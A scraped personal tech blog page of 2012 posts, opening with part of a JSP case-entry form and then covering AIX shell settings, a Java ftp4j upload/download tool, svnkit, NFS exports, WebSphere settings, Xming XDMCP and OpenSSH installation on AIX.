title=&#x27;Cap.&quot; + items.get(1) + &quot; - &quot; + items.get(2) + &quot; - &quot; + items.get(3) + &quot;&#x27; value=&#x27;&quot; + items.get(0) + &quot;&#x27;&gt;Cap.&quot; + items.get(1) + &quot; - &quot; + items.get(2) + &quot; - &quot; + items.get(3) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                      out.print(&quot;&lt;option title=&#x27;Cap.&quot; + items.get(1) + &quot; - &quot; + items.get(2) + &quot; - &quot; + items.get(3) + &quot;&#x27; value=&#x27;&quot; + items.get(0) + &quot;&#x27;&gt;Cap.&quot; + items.get(1) + &quot; - &quot; + items.get(2) + &quot; - &quot; + items.get(3) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                %&gt;</span><br><span class="line">               &lt;/select&gt;</span><br><span class="line">              &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;&lt;b&gt;Legal Advice:&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td&gt;&lt;input id=&quot;accepted&quot; type=&quot;radio&quot; name=&quot;legalAdviceStatus&quot; value=&quot;a&quot;&gt;&lt;label for=&quot;accepted&quot;&gt;Accepted&lt;/label&gt;&lt;/input&gt;&lt;input id=&quot;notAccepted&quot; type=&quot;radio&quot; name=&quot;legalAdviceStatus&quot; value=&quot;na&quot;&gt;&lt;label for=&quot;notAccepted&quot;&gt;Not Accepted&lt;/label&gt;&lt;/input&gt;&lt;input id=&quot;notMentioned&quot; type=&quot;radio&quot; name=&quot;legalAdviceStatus&quot; value=&quot;nm&quot;&gt;&lt;label for=&quot;notMentioned&quot;&gt;Not Mentioned&lt;/label&gt;&lt;/input&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;&lt;b&gt;Legal Advice Remarks:&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td&gt;&lt;textarea name=&quot;legalAdviceRemarks&quot; rows=&quot;5&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;&lt;b&gt;Defendant:&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td&gt;&lt;input id=&quot;employer&quot; type=&quot;checkbox&quot; name=&quot;defendantEmployer&quot; value=&quot;employer&quot;&gt;&lt;label for=&quot;employer&quot;&gt;Employer&lt;/label&gt;&lt;/input&gt;&lt;input id=&quot;employee&quot; type=&quot;checkbox&quot; name=&quot;defendantEmployee&quot; value=&quot;employee&quot;&gt;&lt;label for=&quot;employee&quot;&gt;Employee&lt;/label&gt;&lt;/input&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;&lt;b&gt;Any Authority Reference Mentioned(Y/N):&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td&gt;&lt;input id=&quot;authRefIndY&quot; type=&quot;radio&quot; name=&quot;authRefInd&quot; value=&quot;Y&quot;&gt;&lt;label for=&quot;authRefIndY&quot;&gt;Y&lt;/label&gt;&lt;/input&gt;&lt;input id=&quot;authRefIndN&quot; type=&quot;radio&quot; name=&quot;authRefInd&quot; value=&quot;N&quot;&gt;&lt;label for=&quot;authRefIndN&quot;&gt;N&lt;/label&gt;&lt;/input&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;&lt;b&gt;Authority Reference:&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;authRef&quot; size=&quot;40&quot; value=&quot;&quot; maxlength=&quot;50&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td width=&quot;35%&quot; valign=&quot;top&quot;&gt;&lt;b&gt;File Name:&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td width=&quot;65%&quot;&gt;</span><br><span class="line">               &lt;%</span><br><span class="line">                if(reqCode !=null &amp;&amp; reqCode.equals(&quot;edit&quot;))&#123;</span><br><span class="line">                  final List fileList = caseLegalAdvice.getUploadFiles();</span><br><span class="line">                  Iterator fileIt = fileList.iterator();</span><br><span class="line">                  while(fileIt.hasNext())&#123;</span><br><span class="line">                    String[] file = (String[])fileIt.next();</span><br><span class="line">                    out.print(&quot;&lt;div class=&#x27;uploadFiles&#x27;&gt;&lt;span style=&#x27;display:none&#x27;&gt;&quot; + file[0] + &quot;&lt;/span&gt;&lt;a target=&#x27;_blank&#x27; href=&#x27;upload/prosecutions/&quot; + file[1] + &quot;&#x27;&gt;&quot; + file[1] + &quot;&lt;/a&gt;&amp;nbsp;&lt;img class=&#x27;deleteFile&#x27; style=&#x27;cursor:pointer&#x27; src=&#x27;images/Remove-icon.png&#x27;/&gt;&quot;);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               %&gt;</span><br><span class="line">               &lt;div id=&quot;files&quot;&gt;                           </span><br><span class="line">               &lt;input type=&#x27;file&#x27; accept=&#x27;application/pdf&#x27; name=&#x27;file&#x27; size=&#x27;40&#x27; /&gt;</span><br><span class="line">               &lt;input type=&#x27;file&#x27; accept=&#x27;application/pdf&#x27; name=&#x27;file1&#x27; size=&#x27;40&#x27; /&gt;</span><br><span class="line">               &lt;input type=&#x27;file&#x27; accept=&#x27;application/pdf&#x27; name=&#x27;file2&#x27; size=&#x27;40&#x27; /&gt;</span><br><span class="line">               &lt;img src=&quot;images/Add-icon.png&quot; style=&quot;cursor:pointer&quot; id=&quot;addFile&quot;/&gt;</span><br><span class="line">               &lt;br/&gt;</span><br><span class="line">              &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">          &lt;/table&gt;</span><br><span class="line">          &lt;hr noshade size=&quot;1&quot; color=&quot;#FFFFFF&quot; width=&quot;100%&quot;&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td width=&quot;560&quot;&gt;</span><br><span class="line">          &lt;div align=&quot;right&quot;&gt;</span><br><span class="line">            &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;</span><br><span class="line">              &lt;tr&gt;</span><br><span class="line">               &lt;td colspan=&quot;2&quot;&gt; &lt;%=(errMsg==null) ? &quot;&quot; : errMsg%&gt; &lt;/td&gt;</span><br><span class="line">              &lt;/tr&gt;</span><br><span class="line">              &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;61%&quot;&gt;</span><br><span class="line">                  &lt;input type=&quot;hidden&quot; name=&quot;reqCode&quot; value=&#x27;&lt;%=reqCode%&gt;&#x27;/&gt;</span><br><span class="line">                  &lt;input type=&quot;hidden&quot; name=&quot;keepFileNos&quot; value=&#x27;&#x27;/&gt;</span><br><span class="line">                  &lt;input type=&quot;hidden&quot; name=&quot;caseNo&quot; value=&#x27;&lt;%=request.getParameter(&quot;caseNo&quot;)%&gt;&#x27;/&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;input type=&quot;submit&quot; name=&quot;save&quot; value=&quot;Save&quot;&gt;</span><br><span class="line">                  &lt;%</span><br><span class="line">                    if(reqCode != null &amp;&amp; reqCode.equals(&quot;edit&quot;))&#123;</span><br><span class="line">                      out.print(&quot;&lt;input type=&#x27;submit&#x27; name=&#x27;delete&#x27; value=&#x27;Delete&#x27;&gt;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                  %&gt;</span><br><span class="line">                &lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;39%&quot;&gt;</span><br><span class="line">                  &lt;div align=&quot;right&quot;&gt; </span><br><span class="line">                &lt;/td&gt;</span><br><span class="line">              &lt;/tr&gt;</span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">          </span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">    &lt;p&gt;&lt;br&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-my-aix-.profile-setting" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-04-18T01:17:30.000Z"><a href="/2012/04/18/my-aix-.profile-setting/">2012-04-18</a></time>
      
      
  
    <h1 class="title"><a href="/2012/04/18/my-aix-.profile-setting/">my aix .profile setting</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">export PS1=$USER@`hostname`:&#x27;$PWD # &#x27; </span><br><span class="line">set -o vi </span><br><span class="line"></span><br><span class="line">cd /tmp/xx/tools/usr/local/bin </span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$(pwd) </span><br><span class="line">export PATH=$PATH:`pwd` </span><br><span class="line">export LIBPATH=/tmp/xx/tools/usr/local/lib </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Connect-server-to-upload OR download-by-using-ftp4j" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-04-12T01:37:02.000Z"><a href="/2012/04/12/Connect-server-to-upload%20OR%20download-by-using-ftp4j/">2012-04-12</a></time>
      
      
  
    <h1 class="title"><a href="/2012/04/12/Connect-server-to-upload%20OR%20download-by-using-ftp4j/">Connect server to upload/download by using ftp4j</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>My machine’s charset is traditional chinese(cp950) while server’s charset is utf-8, it must be decoded&#x2F;encoded characters when uploading&#x2F;downloading.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">package ftp;</span><br><span class="line"></span><br><span class="line">import it.sauronsoftware.ftp4j.FTPClient;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.io.OutputStreamWriter;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.cli.CommandLine;</span><br><span class="line">import org.apache.commons.cli.CommandLineParser;</span><br><span class="line">import org.apache.commons.cli.Options;</span><br><span class="line">import org.apache.commons.cli.PosixParser;</span><br><span class="line"></span><br><span class="line">public class FileFetch &#123;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @param args</span><br><span class="line">   * @throws Exception</span><br><span class="line">   */</span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    run(args);</span><br><span class="line">    //changeFormat(&quot;test.txt&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void changeFormat(String file) throws IOException &#123;</span><br><span class="line">    String tmp = &quot;tmp&quot;;</span><br><span class="line">    InputStreamReader reader = new InputStreamReader(new FileInputStream(</span><br><span class="line">        file), &quot;cp936&quot;);</span><br><span class="line">    OutputStream ow = new FileOutputStream(tmp);</span><br><span class="line"></span><br><span class="line">    char[] buffer = new char[4096];</span><br><span class="line"></span><br><span class="line">    int len = 0;</span><br><span class="line">    while (len != -1) &#123;</span><br><span class="line">      len = reader.read(buffer);</span><br><span class="line">      if (len != -1) &#123;</span><br><span class="line">        ow.write(new String(new String(buffer, 0, len)</span><br><span class="line">            .getBytes(&quot;cp936&quot;)).getBytes(&quot;utf-8&quot;));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reader.close();</span><br><span class="line">    ow.close();</span><br><span class="line"></span><br><span class="line">    new File(file).delete();</span><br><span class="line">    new File(tmp).renameTo(new File(file));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void run(String[] args) throws Exception &#123;</span><br><span class="line">    Options options = new Options();</span><br><span class="line">    options.addOption(&quot;ip&quot;, true, &quot;FTP Server IP&quot;);</span><br><span class="line">    options.addOption(&quot;u&quot;, &quot;user&quot;, true, &quot;login user name&quot;);</span><br><span class="line">    options.addOption(&quot;p&quot;, &quot;password&quot;, true, &quot;login password&quot;);</span><br><span class="line">    options.addOption(&quot;rr&quot;, &quot;remoateRoot&quot;, true,</span><br><span class="line">        &quot;remote file path to be fetch&quot;);</span><br><span class="line">    options.addOption(&quot;rd&quot;, &quot;remoteDir&quot;, true,</span><br><span class="line">        &quot;remote file path to be fetch&quot;);</span><br><span class="line">    options.addOption(&quot;d&quot;, &quot;drive&quot;, true, &quot;storage file path drive&quot;);</span><br><span class="line">    options.addOption(&quot;f&quot;, &quot;file&quot;, true, &quot;storage file path&quot;);</span><br><span class="line">    options.addOption(&quot;dn&quot;, &quot;down&quot;, false, &quot;flag to down&quot;);</span><br><span class="line">    options.addOption(&quot;up&quot;, &quot;upload&quot;, false, &quot;flag to upload&quot;);</span><br><span class="line"></span><br><span class="line">    CommandLineParser parser = new PosixParser();</span><br><span class="line">    CommandLine line = parser.parse(options, args);</span><br><span class="line"></span><br><span class="line">    String ip = line.getOptionValue(&quot;ip&quot;);</span><br><span class="line">    String user = line.getOptionValue(&quot;user&quot;);</span><br><span class="line">    String password = line.getOptionValue(&quot;password&quot;);</span><br><span class="line">    String remoateRoot = line.getOptionValue(&quot;remoateRoot&quot;);</span><br><span class="line">    String remoteDir = line.getOptionValue(&quot;remoteDir&quot;);</span><br><span class="line">    String drive = line.getOptionValue(&quot;drive&quot;);</span><br><span class="line">    String filePath = line.getOptionValue(&quot;file&quot;);</span><br><span class="line">    if (line.hasOption(&quot;down&quot;)) &#123;</span><br><span class="line">      getFiles(ip, user, password, remoateRoot, remoteDir, drive,</span><br><span class="line">          filePath, true);</span><br><span class="line">    &#125; else if (line.hasOption(&quot;upload&quot;)) &#123;</span><br><span class="line">      getFiles(ip, user, password, remoateRoot, remoteDir, drive,</span><br><span class="line">          filePath, false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void getFiles(String ip, String user, String passwd,</span><br><span class="line">      String remoateRoot, String remoteDir, String drive,</span><br><span class="line">      String fileName, boolean down) throws Exception &#123;</span><br><span class="line">    FTPClient client = new FTPClient();</span><br><span class="line">    String[] ret = client.connect(ip);</span><br><span class="line">    for (String r : ret) &#123;</span><br><span class="line">      System.out.println(&quot;out &quot; + r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client.login(user, passwd);</span><br><span class="line"></span><br><span class="line">    client.changeDirectory(remoateRoot);</span><br><span class="line">    client.changeDirectory(remoteDir);</span><br><span class="line">    String[] fileNames = client.listNames();</span><br><span class="line">    for (String file : fileNames) &#123;</span><br><span class="line">      if (file.matches(fileName)) &#123;</span><br><span class="line">        String filePath = drive + &quot;/&quot; + remoteDir + &quot;/&quot; + file;</span><br><span class="line">        client.setCharset(&quot;UTF-8&quot;);</span><br><span class="line">        if (down) &#123;</span><br><span class="line">          File dir = new File(drive + &quot;/&quot; + remoteDir);</span><br><span class="line">          if (!dir.exists()) &#123;</span><br><span class="line">            dir.mkdirs();</span><br><span class="line">          &#125;</span><br><span class="line">          OutputStream f = new FileOutputStream(filePath);</span><br><span class="line">          client.download(file, f, -1, null);</span><br><span class="line">          OutputStreamWriter wr = new OutputStreamWriter(f, &quot;UTF-8&quot;);</span><br><span class="line">          wr.flush();</span><br><span class="line">          wr.close();</span><br><span class="line">          changeFormat(filePath);</span><br><span class="line">          System.out.println(&quot;file &quot; + filePath + &quot; is downloaded.&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          client.upload(new File(filePath));</span><br><span class="line">          System.out.println(&quot;file &quot; + filePath + &quot; is uploaded.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  ftpfetch.bat<br><code>java -cp bin;lib/ftp4j-1.7.jar;lib/commons-cli-1.2.jar ftp.FileFetch -ip 10.13.135.81 -u root -p password -rr /piers/apps/uat/installedApps/XXApps.ear/xx.war -d C:\xx -up -rd . -f pros.*</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Java-Subversion-Client" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-15T03:32:28.000Z"><a href="/2012/03/15/Java-Subversion-Client/">2012-03-15</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/15/Java-Subversion-Client/">Java Subversion Client</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>  Fail to install cc or gcc on aix, and installation of subversion by rpm is fail too.<br>  So download svnkit </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export SVNKIT_LIB=svnkit-1.3.7\lib </span><br><span class="line">jsvn co url </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-NFS-on-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-15T03:31:29.000Z"><a href="/2012/03/15/NFS-on-AIX/">2012-03-15</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/15/NFS-on-AIX/">NFS on AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="设置客户端的IP"><a href="#设置客户端的IP" class="headerlink" title="设置客户端的IP"></a>设置客户端的IP</h1><pre><code>/etc/hosts
10.13.135.47 venus01
</code></pre>
<h1 id="添加可以访问的客户端"><a href="#添加可以访问的客户端" class="headerlink" title="添加可以访问的客户端"></a>添加可以访问的客户端</h1><pre><code>/etc/exports
/dbbkup -root=venus01
</code></pre>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exportfs -a</span><br><span class="line">showmount -e</span><br><span class="line">stopsrc -g nfs</span><br><span class="line">startsrc -g nfs</span><br><span class="line">lssrc -g nfs</span><br></pre></td></tr></table></figure>

<h1 id="客户端运行"><a href="#客户端运行" class="headerlink" title="客户端运行"></a>客户端运行</h1><pre><code>mkdir /mnt/bkup
mount 服务器端:/dbbkup /mnt/bkup
</code></pre>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://www.cio69.com/html/201118/89.html">http://www.cio69.com/html/201118/89.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-WAS-problems" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-15T03:30:31.000Z"><a href="/2012/03/15/WAS-problems/">2012-03-15</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/15/WAS-problems/">WAS problems</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ol>
<li>if use Crystal Clear in WAS 5.1, it should config a environment variable ‘DISPLAY&#x3D;:100’ </li>
<li>if use symbolic link in WAS 7, it should config a WebContainer custom property as below<br><code>com.ibm.ws.webcontainer.TolerateSymbolicLinks=true</code></li>
</ol>
<p>Reference:<br><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?rs=180&amp;uid=swg1PK87049">http://www-01.ibm.com/support/docview.wss?rs=180&amp;uid=swg1PK87049</a><br><a target="_blank" rel="noopener" href="http://www.frightanic.com/2010/05/10/solution-to-error-404-srve0190e-on-websphere-6-1/">http://www.frightanic.com/2010/05/10/solution-to-error-404-srve0190e-on-websphere-6-1/</a> </p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-使用Xming連結Aix-CDE桌面" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-13T09:38:20.000Z"><a href="/2012/03/13/%E4%BD%BF%E7%94%A8Xming%E9%80%A3%E7%B5%90Aix-CDE%E6%A1%8C%E9%9D%A2/">2012-03-13</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/13/%E4%BD%BF%E7%94%A8Xming%E9%80%A3%E7%B5%90Aix-CDE%E6%A1%8C%E9%9D%A2/">使用Xming連結Aix CDE桌面</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;XLaunch xmlns=&quot;http://www.straightrunning.com/XmingNotes&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; </span><br><span class="line">xsi:schemaLocation=&quot;http://www.straightrunning.com/XmingNotes XLaunch.xsd&quot; WindowMode=&quot;Windowed&quot; </span><br><span class="line">ClientMode=&quot;XDMCP&quot; XDMCPHost=&quot;10.13.135.31&quot; Display=&quot;0&quot; Clipboard=&quot;true&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://mokmoe.blogspot.com/2008/06/xmingaix-cde.html">http://mokmoe.blogspot.com/2008/06/xmingaix-cde.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-openssh-on-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-03-12T08:19:26.000Z"><a href="/2012/03/12/openssh-on-AIX/">2012-03-12</a></time>
      
      
  
    <h1 class="title"><a href="/2012/03/12/openssh-on-AIX/">openssh on AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="在AIX上安装ssh"><a href="#在AIX上安装ssh" class="headerlink" title="在AIX上安装ssh"></a>在AIX上安装ssh</h1><p>Download openssh(OpenSSH_5.8.0.6102.tar.Z) and openssl(openssl-0.9.8.1800.tar.Z) from<br><a target="_blank" rel="noopener" href="https://www14.software.ibm.com/webapp/iwm/web/preLogin.do?source=aixbp">https://www14.software.ibm.com/webapp/iwm/web/preLogin.do?source=aixbp</a></p>
<h4 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure:"></a>Procedure:</h4><p>   Uncompress openssl-0.9.8.1800.tar.Z</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xvf openssl</span><br><span class="line">smitty install_all</span><br></pre></td></tr></table></figure>

<p>   Uncompress OpenSSH_5.8.0.6102.tar.Z</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar xvf openssh</span><br><span class="line">smitty install_all</span><br><span class="line">* INPUT device / directory for software [.] (note a period)</span><br><span class="line">SOFTWARE to install []  using F4</span><br><span class="line">select filesets using F7</span><br><span class="line">openssh.base, openssh.license, openssh.man.en_US,</span><br><span class="line">openssl.base ,openssl.license, and openssl.man.en_US filesets.</span><br><span class="line"></span><br><span class="line">Enter yes to accept license agreement</span><br></pre></td></tr></table></figure>

<h1 id="列出有关ssh的已安装文件"><a href="#列出有关ssh的已安装文件" class="headerlink" title="列出有关ssh的已安装文件"></a>列出有关ssh的已安装文件</h1><p>   <code>lslpp -L|grep ssh</code></p>
<h4 id="卸装ssh的文件"><a href="#卸装ssh的文件" class="headerlink" title="卸装ssh的文件"></a>卸装ssh的文件</h4><p>   <code>installp -u  openssh.base openssh.license openssh.man.en_US</code></p>
<h4 id="额外地可以列出安装介质中包含的软件"><a href="#额外地可以列出安装介质中包含的软件" class="headerlink" title="额外地可以列出安装介质中包含的软件"></a>额外地可以列出安装介质中包含的软件</h4><p>   <code>installp -L -d /dev/cd0</code></p>
<h4 id="安装失败后如何清理系统"><a href="#安装失败后如何清理系统" class="headerlink" title="安装失败后如何清理系统"></a>安装失败后如何清理系统</h4><p>   <code>installp -C</code></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=isg3T1012923">http://www-01.ibm.com/support/docview.wss?uid=isg3T1012923</a><br><a target="_blank" rel="noopener" href="http://www.ahinc.com/aix/install.htm">http://www.ahinc.com/aix/install.htm</a></p>
